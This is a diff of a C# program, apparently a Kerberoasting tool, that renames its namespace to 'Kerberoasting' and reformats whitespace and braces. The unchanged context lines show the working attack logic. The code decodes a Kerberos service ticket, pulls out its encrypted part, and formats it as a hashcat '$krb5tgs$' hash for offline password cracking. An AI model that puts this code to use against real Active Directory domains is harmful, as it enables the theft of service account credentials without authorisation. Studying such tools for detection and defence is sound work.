@@ -9,7 +9,7 @@ using System.Runtime.InteropServices.WindowsRuntime;
 using System.Text;
 using System.Threading.Tasks;
 
-namespace Kerberos
+namespace Kerberoasting
 {
     class Program
     {
@@ -48,7 +48,7 @@ namespace Kerberos
                     byte[] apRequest = new byte[token.Length - 17];
                     Array.Copy(token, 17, apRequest, 0, token.Length - 17);
                     AsnElt apRep = AsnElt.Decode(apRequest);
-                    
+
                     foreach (AsnElt elem in apRep.Sub[0].Sub)
                     {
                         if (elem.TagValue == 3)
@@ -67,7 +67,8 @@ namespace Kerberos
                                         {
                                             byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                             string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
-                                            if (encTypeToken == 17) {
+                                            if (encTypeToken == 17)
+                                            {
                                                 encryptionType = "aes128-cts-hmac-sha1-96";
                                                 hashcatFormat = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encTypeToken, userName, domainName, servicePrincipalName, cipherText.Substring(0, 32), cipherText.Substring(32));
                                                 Console.WriteLine("> Encryption Type..........:" + encryptionType);
